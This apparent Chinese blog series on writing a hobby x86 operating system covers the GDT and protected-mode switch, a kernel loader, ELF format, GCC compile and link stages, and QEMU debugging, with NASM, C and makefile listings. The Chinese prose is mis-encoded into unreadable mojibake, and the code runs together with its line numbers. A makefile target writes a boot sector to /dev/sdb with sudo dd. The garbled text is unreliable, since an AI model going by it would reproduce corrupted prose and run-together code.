å¯ä»¥åœ¨bochsè°ƒè¯•çœ‹åˆ°æ¯æ¬¡è°ƒç”¨è¿”å›åœ°ARDSç»“æ„ä½“å†…å®¹ å‚è€ƒ x86çš„E820hå­åŠŸèƒ½ ä¸€æ­¥æ­¥ç¼–å†™æ“ä½œç³»ç»Ÿ 33 åˆ©ç”¨biosä¸­æ–­0x15å­åŠŸèƒ½0xe820è·å–å†…å­˜ æ“ä½œç³»ç»Ÿå®ç°-ä¿æŠ¤æ¨¡å¼ä¸å…¨å±€æè¿°ç¬¦ 8086 1M å†…å­˜ï¼Œå®æ¨¡å¼ï¼Œå¯ä»¥å®Œå…¨æ§åˆ¶è®¡ç®—æœº 80286 ä¿æŠ¤æ¨¡å¼ 16ä½ ä¿æŠ¤æ¨¡å¼ IT å¯„å­˜å™¨ Register / æœ‰äº›å¯„å­˜å™¨åªèƒ½æ“ä½œç³»ç»Ÿä½¿ç”¨ é«˜é€Ÿç¼“å­˜ Cache å†…å­˜ / æè¿°ç¬¦ å¤–éƒ¨è®¾å¤‡ / ç¡¬ç›˜ int/out å…¨å±€æè¿°ç¬¦ 80386 æè¿°ç¬¦ å…¨å±€æè¿°ç¬¦è¡¨ GDT 1descriptor gdt[8192]; 0 å¿…é¡»å…¨ä¸º 0-null æè¿°ç¬¦ 8191 é€šç”¨ 12lgdt [gdt_ptr]; //load gdtsgdt [gdt_ptr]; // save gdt æ®µé€‰æ‹©å­ åªéœ€è¦ä¸€ä¸ªä»£ç æ®µ éœ€è¦ä¸€ä¸ªæˆ–å¤šä¸ªæ®µ åŠ è½½åˆ°æ®µå¯„å­˜å™¨ä¸­ / æ ¡éªŒç‰¹æƒç­‰çº§ 123456typedef struct selector&#123; unsigned char RPL :2; unsigned char TI :1; //local descriptor table unsigned short index :13;&#125; __attribute__((packed)) selector; cs / ds / es /gs fs / gs A20çº¿ å‚è€ƒç¬¬ä¸€ç¯‡æ–‡ç« ï¼Œæ¥æºäº8086æœ€å¼€å§‹åªæœ‰20æ¡åœ°å€çº¿ æ‰“å¼€æ˜¯ä¿®æ”¹0x92ç«¯å£ PE Protect Enable cr0å¯„å­˜å™¨ 0 ä½ ç½® 1 loader.asm å‡†å¤‡å·¥ä½œï¼Œå®šä¹‰ä¸€äº›å¸¸é‡ 1234567891011121314151617181920212223242526272829code_selector equ (1&lt;&lt;3);ä»£ç æ®µé€‰æ‹©å­data_selector equ (2&lt;&lt;3);æ•°æ®æ®µé€‰æ‹©å­memeory_base equ 0;å†…å­˜èµ·å§‹åœ°å€ åŸºåœ°å€memeory_limit (1024 * 1024 * 1024 *4) / (1024*4) - 1; å†…å­˜ç•Œé™ 4G/4K -1;;;;;;;;;;;;gdt[2]gdt_ptr: dw (gdt_end-gdt_base)-1 dd gdt_basegdt_base: dd 0,0 ;nullæè¿°ç¬¦gdt_code: dw memeory_limit &amp; 0xffff ; æ®µç•Œé™ 0-15 dw memeory_base &amp; 0xffff ; åŸºåœ°å€ 0-16 db memeory_base&gt;&gt;16 &amp; 0xff ; åŸºåœ°å€ 0-16 db 0b_1_00_1_1_0_1_0 ; å­˜åœ¨-dlp_0-S_ä»£ç -éä¾ä»-å¯è¯»-æ²¡æœ‰è¢«è®¿é—®è¿‡ ; 4k-32ä½-ä¸æ˜¯64ä½-avaliable_0-æ®µç•Œé™16~19 db 0b_1_1_0_0_0000 | (memeory_limit &gt;&gt; 16) &amp;0xf db (memeory_base &gt;&gt; 24) &amp; 0xffgdt_data: dw memeory_limit &amp; 0xffff ; æ®µç•Œé™ 0-15 dw memeory_base &amp; 0xffff ; åŸºåœ°å€ 0-16 db memeory_base&gt;&gt;16 &amp; 0xff ; åŸºåœ°å€ 0-16 ; å­˜åœ¨-dlp_0-S_æ•°æ®-éä¾ä»å‘ä¸Š-å¯è¯»-æ²¡æœ‰è¢«è®¿é—®è¿‡ db 0b_1_00_1_0_0_1_0 ; 4k-32ä½-ä¸æ˜¯64ä½-avaliable_0-æ®µç•Œé™16~19 db 0b_1_1_0_0_0000 | (memeory_limit &gt;&gt; 16) &amp;0xf db (memeory_base &gt;&gt; 24) &amp; 0xff gdt_end: å‡†å¤‡ä¿æŠ¤æ¨¡å¼ 12345678910111213141516171819prepare_protected_mode: xchg bx,bx cli;å…³é—­ä¸­æ–­ ; æ‰“å¼€A20çº¿ in al, 0x92 or al, 0b10 out 0x92, al ;åŠ è½½GDT lgdt [gdt_ptr] ;å¯åŠ¨ä¿æŠ¤æ¨¡å¼ mov eax, cr0 or eax, 1 mov cr0, eax ;ç”¨è·³è½¬åˆ·æ–°ç¼“å­˜ï¼Œå¯ç”¨ä¿æŠ¤æ¨¡å¼ jmp dword code_selector:protected_mode è¿›å…¥ä¿æŠ¤æ¨¡å¼ 123456789101112131415protected_mode: xchg bx, bx mov ax, data_selector ;åˆå§‹åŒ–æ®µå¯„å­˜å™¨ mov ds, ax mov es, ax mov fs, ax mov gs, ax mov ss, ax mov esp, 0x10000; æ ˆé¡¶ mov byte [0xb8000], &#x27;P&#x27; mov byte [0x200000], &#x27;P&#x27;jmp $ å‚è€ƒ https://www.bilibili.com/video/BV1bT4y1k7EQ å†…æ ¸ç¬¬äºŒè®²,å†…å­˜ä¿æŠ¤çš„å®ç°,ä»¥åŠçŸ¥è¯†ç®€ä»‹,å±€éƒ¨æè¿°ç¬¦,å…¨å±€æè¿°ç¬¦. æ“ä½œç³»ç»Ÿå®ç°-è¿›å…¥å†…æ ¸ åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å®ç°äº†è¿›å…¥ä¿æŠ¤æ¨¡å¼ï¼Œé‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯è¿›å…¥æ“ä½œç³»ç»Ÿå†…æ ¸ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ç»™å¯„å­˜å™¨èµ‹å€¼ï¼Œèƒ½ä½¿ç”¨æ›´å¤§çš„å†…å­˜åœ°å€ç©ºé—´ æ–‡ä»¶æ•´ç† é¦–å…ˆå¯¹æ•´ä¸ªæ–‡ä»¶å¤¹ç›®å½•ç»“æ„å¦‚ä¸‹ 123456789101112131415161718192021joe1sn@ubuntu:~/Desktop/os2$ tree.â”œâ”€â”€ buildâ”‚ â”œâ”€â”€ bootâ”‚ â”‚ â”œâ”€â”€ boot.binâ”‚ â”‚ â””â”€â”€ loader.binâ”‚ â”œâ”€â”€ kernelâ”‚ â”‚ â””â”€â”€ start.oâ”‚ â”œâ”€â”€ kernel.binâ”‚ â”œâ”€â”€ master.imgâ”‚ â”œâ”€â”€ system.binâ”‚ â””â”€â”€ system.mapâ””â”€â”€ src â”œâ”€â”€ bochsrc â”œâ”€â”€ boot â”‚ â”œâ”€â”€ boot.asm â”‚ â””â”€â”€ loader.asm â”œâ”€â”€ build â”œâ”€â”€ kernel â”‚ â””â”€â”€ start.asm â””â”€â”€ makefile build æ‰€æœ‰æœ€ç»ˆç”Ÿæˆçš„æ–‡ä»¶éƒ½ä¼šæ”¾åœ¨è¿™é‡Œ bootï¼šMBRä»¥åŠbootç›¸å…³äºŒè¿›åˆ¶æ–‡ä»¶ kernelï¼šæ“ä½œç³»ç»Ÿå¯åŠ¨çš„ç›¸å…³äºŒè¿›åˆ¶æ–‡ä»¶ src æºä»£ç  bochsrcï¼šbochsé…ç½®æ–‡ä»¶ bootï¼šMBRä»¥åŠbootç›¸å…³æºä»£ç  kenelï¼šæ“ä½œç³»ç»Ÿæºä»£ç  makefileï¼šé¡¹ç›®ç¼–è¯‘æ–‡ä»¶ å¯¹åº”ä¿®æ”¹çš„makefile 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152BUILD:=../buildSRC:=.ENTRYPOINT:=0x10000$(BUILD)/boot/%.bin: $(SRC)/boot/%.asm $(shell mkdir -p $(dir $@)) nasm -f bin $&lt; -o $@$(BUILD)/kernel/%.o: $(SRC)/kernel/%.asm $(shell mkdir -p $(dir $@)) nasm -f elf32 $&lt; -o $@$(BUILD)/kernel.bin: $(BUILD)/kernel/start.o $(shell mkdir -p $(dir $@)) ld -m elf_i386 -static $^ -o $@ -Ttext $(ENTRYPOINT)$(BUILD)/system.bin: $(BUILD)/kernel.bin objcopy -O binary $&lt; $@$(BUILD)/system.map: $(BUILD)/kernel.bin nm $&lt; | sort &gt; $@$(BUILD)/master.img: $(BUILD)/boot/boot.bin \\ $(BUILD)/boot/loader.bin \\ $(BUILD)/system.bin \\ $(BUILD)/system.map \\ yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q $(BUILD)/master.img dd if=$(BUILD)/boot/boot.bin of=$@ bs=512 count=1 conv=notrunc dd if=$(BUILD)/boot/loader.bin of=$@ bs=512 count=4 seek=2 conv=notrunc dd if=$(BUILD)/system.bin of=$@ bs=512 count=200 seek=10 conv=notrunc.PHONY: cleanclean: rm -rf $(BUILD)/*.PHONY: usbusb: $(BUILD)/boot/boot.bin /dev/sdb sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc cp tmp.bin usb.bin sudo rm tmp.bin dd if=$(BUILD)/boot/boot.bin of=usb.bin bs=446 count=1 conv=notrunc sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc rm usb.bintest: $(BUILD)/master.img.PHONY: bochsbochs: $(BUILD)/master.img bochs -q åœ¨bochsrcé…ç½®é‡Œé¢æ³¨æ„æ›´æ”¹ç¡¬ç›˜çš„pathé…ç½®ä¸º â€¦/build/master.img æµ‹è¯• src/kernel/start.asm 12345[bits 32]global _start_start: mov byte [0xb8000], &#x27;k&#x27;; è¡¨ç¤ºè¿›å…¥äº†å†…æ ¸ src/boot/loader.asm åœ¨protect_modeé‡Œé¢æ·»åŠ ï¼Œè°ƒæ•´æ ˆå¸§åï¼Œä½¿ç”¨ä»£ç é€‰æ‹©å­è·³è½¬åˆ°0x10000å†…å­˜æ‰§è¡Œstart.asm 1234567mov esp, 0x10000; æ ˆé¡¶mov edi, 0x10000 ; è¯»åˆ°çš„ç›®æ ‡å†…å­˜mov ecx, 10 ; èµ·å§‹æ‰‡åŒºmov bl,200 ;æ‰‡åŒºæ•°é‡call read_disk; xchg bx, bxjmp dword code_selector:0x10000 åœ¨ç›®æ ‡å†…å­˜åœ°å€(0x10000)æ‰¾åˆ°kernel.binçš„äºŒè¿›åˆ¶ä»£ç  æ“ä½œç³»ç»Ÿå®ç°-ELFæ–‡ä»¶æ ¼å¼ è¿™ä¸ªå¯¹CTFpwneræ¥è¯´æ¯”è¾ƒç®€å• ELFçš„ä¸‰ç§æ ¼å¼ å¯é‡å®šä½æ–‡ä»¶ï¼ˆRelocatable fileï¼‰ åŒ…å«äº†ä»£ç å’Œæ•°æ®ï¼Œå¯ä»¥å’Œå…¶ä»–ç›®æ ‡æ–‡ä»¶é“¾æ¥ç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº« ç›®æ ‡æ–‡ä»¶ã€‚ å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆExecutable Fileï¼‰ åŒ…å«äº†å¯ä»¥ç›´æ¥æ‰§è¡Œçš„æ–‡ä»¶ã€‚ å…±äº«ç›®æ ‡æ–‡ä»¶ï¼ˆShared Object Fileï¼‰ åŒ…å«äº†ç”¨äºé“¾æ¥çš„ä»£ç å’Œæ•°æ®ï¼Œåˆ†ä¸¤ç§æƒ…å†µã€‚ä¸€ç§æ˜¯é“¾æ¥å™¨å°†å…¶ä¸å…¶ä»–çš„ å¯é‡å®šä½æ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶é“¾æ¥èµ·æ¥ï¼Œç”Ÿäº§æ–°çš„ç›®æ ‡æ–‡ä»¶ã€‚å¦ä¸€ç§æ˜¯åŠ¨ æ€é“¾æ¥å™¨å°†å¤šä¸ªå…±äº«ç›®æ ‡æ–‡ä»¶ä¸å¯æ‰§è¡Œæ–‡ä»¶ç»“åˆï¼Œä½œä¸ºè¿›ç¨‹æ˜ åƒçš„ä¸€éƒ¨ åˆ† å†…æ ¸çš„æ–‡ä»¶æ ¼å¼ï¼šå¯æ‰§è¡Œç¨‹åº ä»£ç æ®µ .text section(ELFæ–‡ä»¶æ®µ)| segment CPU æ•°æ® .data sectionï¼šå·²ç»åˆå§‹åŒ–è¿‡åçš„æ•°æ® .bss(Block Started by Symbol)ï¼šæœªåˆå§‹åŒ–è¿‡çš„æ•°æ® ç¨‹åºåˆ†æ 12345#include &lt;stdio.h&gt; int main()&#123; printf(&quot;hello world\\n&quot;); return 0;&#125; ç¼–è¯‘ 1gcc -m32 hello.c -o hello ä½¿ç”¨readelf objdump IDA_PROç­‰æŸ¥çœ‹ 1readelf -e hello ç›¸å…³èµ„æ–™ CTF-WIKI ELF æ–‡ä»¶ æ“ä½œç³»ç»Ÿå®ç°-ç¼–è¯‘é“¾æ¥ä¸æ•°æ®ç±»å‹ ç¼–è¯‘é“¾æ¥ å½“GCCç¼–è¯‘ç¨‹åºçš„æ—¶å€™ä¼šç»å†ä¸Šè¿°å‡ æ­¥ï¼š æˆ‘ä»¬åœ¨é¡¹ç›® æ–°å»ºsrc/kernel/include/xsys åœ¨é‡Œé¢æ–°å»ºinclude/xsys/xsys.h 12345678#ifndef XSYS_H#define XSYS_H#define XSYS_MAGIC 20220227void kernel_init(); //åˆå§‹åŒ–å†…æ ¸#endif åˆ›å»ºsrc/kernel/main.c 123456789101112131415#include &lt;xsys/xsys.h&gt;int magic = XSYS_MAGIC; char message[]=&quot;hello Xsys&quot;; //.datachar buf[1024]; //.bssvoid kernel_init()&#123; char *video = (char *) 0xb8000; //æ–‡æœ¬æ˜¾ç¤ºå™¨å†…å­˜ä½ç½® for (int i = 0; i &lt; sizeof(message); i++) &#123; video[i*2]=message[i]; &#125;&#125; é¢„å¤„ç† 1gcc -m32 -E main.c -I ../include/ &gt; test.c è¿™æ ·å°±ç”Ÿæˆäº†main.cçš„ä¸å¤„ç†æ–‡ä»¶ 12345678910111213141516171819202122232425# 1 &quot;main.c&quot;# 1 &quot;&lt;built-in&gt;&quot;# 1 &quot;&lt;command-line&gt;&quot;# 31 &quot;&lt;command-line&gt;&quot;# 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4# 32 &quot;&lt;command-line&gt;&quot; 2# 1 &quot;main.c&quot;# 1 &quot;../include/xsys/xsys.h&quot; 1void kernel_init();# 2 &quot;main.c&quot; 2int magic = 20220227;char message[]=&quot;hello Xsys&quot;;char buf[1024];void kernel_init()&#123; char *video = (char *) 0xb8000; for (int i = 0; i &lt; sizeof(message); i++) &#123; video[i*2]=message[i]; &#125;&#125; æ±‡ç¼– 1gcc -m32 -S test.c &gt; test.s å¾—åˆ°Cè½¬æ±‡ç¼–çš„æºä»£ç æ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475 .file &quot;test.c&quot; .text .globl magic .data .align 4 .type magic, @object .size magic, 4magic: .long 20220227 .globl message .align 4 .type message, @object .size message, 11message: .string &quot;hello Xsys&quot; .comm buf,1024,32 .text .globl kernel_init .type kernel_init, @functionkernel_init:.LFB0: .cfi_startproc pushl %ebp .cfi_def_cfa_offset 8 .cfi_offset 5, -8 movl %esp, %ebp .cfi_def_cfa_register 5 pushl %ebx subl $16, %esp .cfi_offset 3, -12 call __x86.get_pc_thunk.ax addl $_GLOBAL_OFFSET_TABLE_, %eax movl $753664, -8(%ebp) movl $0, -12(%ebp) jmp .L2.L3: movl -12(%ebp), %edx addl %edx, %edx movl %edx, %ecx movl -8(%ebp), %edx addl %edx, %ecx leal message@GOTOFF(%eax), %ebx movl -12(%ebp), %edx addl %ebx, %edx movzbl (%edx), %edx movb %dl, (%ecx) addl $1, -12(%ebp).L2: movl -12(%ebp), %edx cmpl $10, %edx jbe .L3 nop addl $16, %esp popl %ebx .cfi_restore 3 popl %ebp .cfi_restore 5 .cfi_def_cfa 4, 4 ret .cfi_endproc.LFE0: .size kernel_init, .-kernel_init .section .text.__x86.get_pc_thunk.ax,&quot;axG&quot;,@progbits,__x86.get_pc_thunk.ax,comdat .globl __x86.get_pc_thunk.ax .hidden __x86.get_pc_thunk.ax .type __x86.get_pc_thunk.ax, @function__x86.get_pc_thunk.ax:.LFB1: .cfi_startproc movl (%esp), %eax ret .cfi_endproc.LFE1: .ident &quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0&quot; .section .note.GNU-stack,&quot;&quot;,@progbits ç¼–è¯‘ 1as -32 test.s -o test.o å°†test.sç¼–è¯‘ä½32ä½çš„ELFæ–‡ä»¶test.o è¿™ä¸ªæ—¶å€™ä½¿ç”¨readelfæŸ¥çœ‹æ–‡ä»¶ç»“æ„ 1readelf -a test.o ä¼šçœ‹åˆ°è¿™äº›æ®µéƒ½æ˜¯æ²¡æœ‰åœ°å€çš„ï¼Œå½“æˆ‘ä»¬é“¾æ¥æ‰èƒ½æ‰¾åˆ°å‡†ç¡®çš„åœ°å€ åŒæ—¶æˆ‘ä»¬çš„å˜é‡ä¹ŸåŠ å…¥åˆ°äº†ç¬¦å·è¡¨ä¸­ é“¾æ¥ 1ld -m elf_i386 -static test.o -o test.out -e kernel_init å°†test.oæ–‡ä»¶æŒ‰ç…§elf i386çš„æ ¼å¼é“¾æ¥åˆ°åº“æ–‡ä»¶ï¼ŒåŒæ—¶å£°æ˜å¤–éƒ¨å‡½æ•°kernel_init è¿™ä¸ªæ—¶å€™å·²ç»æœ‰äº†Addräº†ï¼Œä½†æ˜¯å¯åŠ¨è¿˜æ˜¯ä¼šå‡ºé”™ï¼Œå› ä¸ºæˆ‘ä»¬ä¹‹å‰å®šä¹‰çš„æ˜¯åœ¨0x10000å‡ºå¯åŠ¨ç¨‹åº gccç›´æ¥ç¼–è¯‘ 1gcc -m32 main.c -I ../include/ -o main.out -e kernel_init -nostartfiles -nostartfilesï¼šç±»ä¼¼ä¸windowsé‡Œé¢çš„å…¥å£ç‚¹ä¸ä½¿ç”¨main å†™å…¥åˆ°æ“ä½œç³»ç»Ÿ æ·»åŠ ä¸€ä¸ªkernel/%.cç¼–è¯‘åˆ°kernel/%.oçš„makefile 123$(BUILD)/kernel/%.o: $(SRC)/kernel/%.c $(shell mkdir -p $(dir $@)) gcc $(CFLAGS) $(DEBUG) $(INCLUDE) -c $&lt; -o $@ åŒæ—¶å¯ä»¥åŠ è¿˜æ˜¯é‚£ä¸ªç¼–è¯‘å‚æ•° 123DEBUG:= -gCFLAGS:= -m32INCLUDE:= -I$(SRC)/include å®Œæ•´çš„makefileå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455BUILD:=../buildSRC:=.ENTRYPOINT:=0x10000CFLAGS:= -m32DEBUG:= -gINCLUDE:= -I$(SRC)/include$(BUILD)/boot/%.bin: $(SRC)/boot/%.asm $(shell mkdir -p $(dir $@)) nasm -f bin $&lt; -o $@$(BUILD)/kernel/%.o: $(SRC)/kernel/%.asm $(shell mkdir -p $(dir $@)) nasm -f elf32 $(DEBUG) $&lt; -o $@$(BUILD)/kernel/%.o: $(SRC)/kernel/%.c $(shell mkdir -p $(dir $@)) gcc $(CFLAGS) $(DEBUG) $(INCLUDE) -c $&lt; -o $@ $(BUILD)/kernel.bin: $(BUILD)/kernel/start.o \\ $(BUILD)/kernel/main.o $(shell mkdir -p $(dir $@)) ld -m elf_i386 -static $^ -o $@ -Ttext $(ENTRYPOINT)#objcpoyåŠ è½½bssæ®µå±•å¼€æ–‡ä»¶$(BUILD)/system.bin: $(BUILD)/kernel.bin objcopy -O binary $&lt; $@$(BUILD)/system.map: $(BUILD)/kernel.bin nm $&lt; | sort &gt; $@$(BUILD)/master.img: $(BUILD)/boot/boot.bin \\ $(BUILD)/boot/loader.bin \\ $(BUILD)/system.bin \\ $(BUILD)/system.map \\ yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q $(BUILD)/master.img dd if=$(BUILD)/boot/boot.bin of=$@ bs=512 count=1 conv=notrunc dd if=$(BUILD)/boot/loader.bin of=$@ bs=512 count=4 seek=2 conv=notrunc dd if=$(BUILD)/system.bin of=$@ bs=512 count=200 seek=10 conv=notrunc.PHONY: cleanclean: rm -rf $(BUILD)/*test: $(BUILD)/master.img.PHONY: bochsbochs: $(BUILD)/master.img bochs -q å†ä¿®æ”¹ä¸‹kernel/start.asm 123456789101112[bits 32]extern kernel_initglobal _start_start: ; mov byte [0xb8000], &#x27;k&#x27;; è¡¨ç¤ºè¿›å…¥äº†å†…æ ¸ xchg bx, bx call kernel_init xchg bx, bx jmp $ make testä¸€ä¸‹æ²¡é—®é¢˜åmake cleanå†make bochsè°ƒè¯• è¿›å…¥kernel_init æ˜¾ç¤ºè¾“å‡ºè¢«è¦†ç›–ï¼Œè¯´æ˜è°ƒç”¨æˆåŠŸ æ•°æ®ç±»å‹ åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œæ•°æ®ç±»å‹éƒ½æ˜¯è¢«å®šä¹‰å¥½çš„ æ–°å»ºinclude/xsys/types.h 1234567891011121314151617181920212223242526#ifndef XSYS_TYPES_H#define XSYS_TYPES_H#define EOF -1 //end of file#define NULL 0 //ç©ºæŒ‡é’ˆ#define bool _Bool#define true 1#define false 0//#define _packed __attribute__((packed))typedef unsigned int size_t;typedef char int8;typedef short int16;typedef int int32;typedef long int64;typedef unsigned char u8;typedef unsigned short u16;typedef unsigned int u32;typedef unsigned long u64;#endif æ–°å»ºtest/test.c 1234567891011121314151617181920212223242526272829303132#include &lt;xsys/types.h&gt;#include &lt;stdio.h&gt;typedef struct descriptor&#123; unsigned short limit_low; unsigned int base_low : 24; unsigned char type : 4; unsigned char segment : 1; unsigned char DPL : 2; unsigned char present : 1; unsigned char limit_high :4; unsigned char avaliable : 1; unsigned char long_mode : 1; unsigned char big : 1; unsigned char granulartity : 1; unsigned char base_high;&#125; __attribute__((packed)) descriptor;// &#125;descriptor;int main()&#123; printf(&quot;size of u8 %d\\n&quot;, sizeof(u8)); printf(&quot;size of u16 %d\\n&quot;, sizeof(u16)); printf(&quot;size of u32 %d\\n&quot;, sizeof(u32)); printf(&quot;size of u64 %d\\n&quot;, sizeof(u64)); printf(&quot;size of descriptor %d\\n&quot;, sizeof(descriptor)); descriptor des; return 0;&#125; __attribute__ç”¨äºä¸å¯¹é½å˜é‡æ¥æ„é€ ç‰¹æ®Šç»“æ„ä½“ï¼Œä½¿ç”¨vscodeè‡ªå¸¦çš„è°ƒè¯•å¯ä»¥çœ‹å‡º æ“ä½œç³»ç»Ÿå®ç°-qemuè°ƒè¯•ä¸vmdk qemuè°ƒè¯• å…¶å®ä½ ä¹Ÿå¯ä»¥ç”¨bochs-gdbï¼Œä½†æ˜¯æˆ‘è§‰å¾—bochs-gdbè¦é‡æ–°é…ç½®ä¸€äº›æ–‡ä»¶å¾ˆéº»çƒ¦ï¼Œè¿˜æ˜¯vm+vscodeè°ƒè¯•æ–¹ä¾¿äº›ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ç”¨åˆ°qemu å®‰è£…qemu 12sudo apt-get install qemusudo apt-get install qemu-extract åœ¨qemuä¸­å¯åŠ¨ç³»ç»Ÿ src/makefileä¸­ï¼Œæ·»åŠ  123456.PHONY: qemuqemu: $(BUILD)/master.img qemu-system-i386 \\ -m 32M \\ -boot c \\ -hda $&lt; ä½¿ç”¨i386æ„æ¶çš„CPUï¼Œå†…å­˜ä½32MBï¼Œå­˜å‚¨æ˜¯ç¡¬ç›˜(boot -c)ï¼Œé€‰æ‹©çš„ç¡¬ç›˜æ–‡ä»¶æ˜¯$(BUILD)/master.img ä½¿ç”¨qemuè°ƒè¯• src/makefileä¸­ï¼Œæ·»åŠ  1234567.PHONY: qemugqemug: $(BUILD)/master.img qemu-system-i386 \\ -s -S \\ -m 32M \\ -boot c \\ -hda $&lt; è¿™é‡Œ-s -Sæ˜¯è°ƒè¯•ï¼Œè¿œç¨‹è°ƒè¯•ï¼Œè¿œç¨‹è°ƒè¯•ç«¯å£æ˜¯1234 ä¸ºäº†æµ‹è¯•ï¼Œä½¿ç”¨vscodeåœ¨src/kernel/main.cä¸­ä¸‹ä¸ªæ–­ç‚¹ åœ¨vmä¸­å¯ç”¨qemuè°ƒè¯•ï¼Œqemuç­‰å¾…debuggerå¯åŠ¨è°ƒè¯• ä¹‹åå¯ä»¥åœ¨vscodeä¸­ç›´æ¥ä½¿ç”¨F5è°ƒè¯•ï¼Œä½†æ˜¯launch.jsonä¸­çš„programè¦æ”¹ä¸º**${workspaceFolder}/build/kernel.bin** F5å¼€å§‹è°ƒè¯• æ¥ç€ç»§ç»­ vmdk ä½¿ç”¨qemuçš„ä¸€äº›åŠŸèƒ½å¯ä»¥æŠŠæˆ‘ä»¬çš„master.imgè½¬æ¢æˆmaster.vmdkä»è€Œåœ¨vmwareä¸Šè¿è¡Œ åœ¨src/makefileä¸­æ–°å¢ 12345$(BUILD)/master.vmdk: $(BUILD)/master.img qemu-img convert -O vmdk $&lt; $@.PHONY: vmdkvmdk: $(BUILD)/master.vmdk å¾—åˆ°vmdkæ–‡ä»¶è¿‡åç›´æ¥åˆ›å»ºè™šæ‹Ÿæœºå°±è¡Œäº† åœ¨åˆ›å»ºè™šæ‹Ÿæœºæ˜¯è¦æ³¨æ„ï¼š Linuxç‰ˆæœ¬æœ€å¥½&gt;=4ï¼Œä¸ç„¶\\xaa\\x55æ ¡éªŒè¿‡ä¸äº† è™šæ‹Ÿç£ç›˜ç±»å‹é€‰æ‹©IDE ä½¿ç”¨ç°æœ‰è™šæ‹Ÿç£ç›˜ï¼Œé€‰æ‹©åˆšæ‰ç”Ÿæˆçš„vmdkæ–‡ä»¶å°±è¡Œ æ“ä½œç³»ç»Ÿå®ç°-gccä¸æ±‡ç¼– åœ¨ä¹‹å‰çš„testæ–‡ä»¶ä¸­æ–°å»ºä¸€ä¸ªhello.cå’Œsrc/test/makefile hello.c 12345678910#include &lt;stdio.h&gt;char message[] = &quot;hello world\\n&quot;;char buf[1024];int main()&#123; printf(&quot;%s\\n&quot;,message); return 0;&#125; makefile 12345678910111213CFLAGS:= -m32# CFLAGS+= -fno-builtin #ä¸éœ€è¦gccå†…ç½®å‡½æ•°# CFLAGS+= -nostdinc #ä¸ç”¨æ ‡å‡†å¤´æ–‡ä»¶# CFLAGS+= -nostdlib #ä¸éœ€è¦æ ‡å‡†åº“# CFLAGS+= -fno-pic #ä¸éœ€è¦ä½ç½®æ— å…³ä»£ç # CFLAGS+= -fno-pie #å…³é—­PIEä¿æŠ¤# CFLAGS+= -fno-stack-protector #ä¸éœ€è¦æ ˆä¿æŠ¤CFLAGS:=$(strip $&#123;CFLAGS&#125;).PHONY: hello.shello.s: hello.c gcc $(CFLAGS) -S $&lt; -o $@ åœ¨ç”Ÿæˆäº†.sæ±‡ç¼–æ–‡ä»¶ä¸­ï¼Œä¼šå‘ç°æœ‰**.cfi**å¼€å§‹æŠ•çš„æ®µ .cfiï¼šCall Frame Informationï¼ˆè°ƒç”¨æ ˆå¸§ä¿¡æ¯ï¼‰ ä¸€ç§DWARFä¿¡æ¯ï¼Œç”¨äºè°ƒè¯•ï¼Œè·å¾—è°ƒç”¨å¼‚å¸¸ -fno-asynchronous-unwind-tablesï¼Œä¸éœ€è¦cfiä¿¡æ¯ call __x86.get_pc_thunk.axï¼šç”ŸæˆPICçš„è¾…åŠ©å‡½æ•°ï¼Œè·å–è°ƒç”¨æ—¶EIPçš„å€¼ï¼ŒåŠŸèƒ½ä¸Šç›¸å½“äºmov eax, eipï¼Œæ¥ç€å¾—åˆ° _GLOBAL_OFFSET_TABLE_ PICï¼špostion independent codeï¼ˆä½ç½®æ— å…³ä»£ç ï¼‰ -fno-picï¼Œä¸éœ€è¦ä½ç½®æ— å…³ä»£ç  ** _GLOBAL_OFFSET_TABLE_ **ï¼šé‡Œé¢å­˜å‚¨äº†ç¬¦å·åœ°å€ä¿¡æ¯ .ident &quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0ï¼š .identï¼šGCCçš„ç‰ˆæœ¬ä¿¡æ¯ -Qnï¼šå»æ‰GCCç‰ˆæœ¬ä¿¡æ¯ andl $-16, %espï¼šæ ˆå¯¹é½ âˆ’16=0âˆ’16=0âˆ’10H=fffffff0H-16 = 0 - 16 = 0-10H = fffffff0Hâˆ’16=0âˆ’16=0âˆ’10H=fffffff0H ä¸æ“ä½œè¿‡åå°±æœ‰åªå‰©æœ€åå››ä½ï¼Œè¿™æ ·å°±å°†æ ˆ16å­—èŠ‚å¯¹é½ å­—èŠ‚å¯¹é½è®¿é—®å†…å­˜æ›´åŠ é«˜æ•ˆï¼ˆä½¿ç”¨æ›´å°‘çš„æ—¶é’Ÿå‘¨æœŸï¼‰ æ•°æ®è®¿é—®çš„è¿‡ç¨‹ï¼š å¾…è¯»æ•°æ®çš„å†…å­˜åœ°å€æ”¾å…¥åœ°å€æ€»çº¿ ä¿®æ”¹READæ ‡å¿—å¯ç”¨æ–­è¨€ï¼ŒåŠæ²¡æœ‰æ­£ç¡®å°±ä¼šå‡ºå‘haltæš‚åœ ç­‰å¾…å†…å­˜æ§åˆ¶å™¨å“åº” æŠŠæ•°æ®ä»æ•°æ®æ€»çº¿å¤åˆ¶åˆ°ç›®æ ‡åœ°å€ ç”±ä¸Šï¼šè‹¥ä¸å¯¹é½è®¿é—®çš„è¯ï¼Œä¼šå¤šä¼ å‡ æ¬¡åœ°å€æ‰èƒ½å¾—åˆ°éœ€è¦çš„å€¼ï¼Œä»è€Œé€ æˆæ›´å¤šçš„æ—¶é’Ÿå‘¨æœŸæµªè´¹ 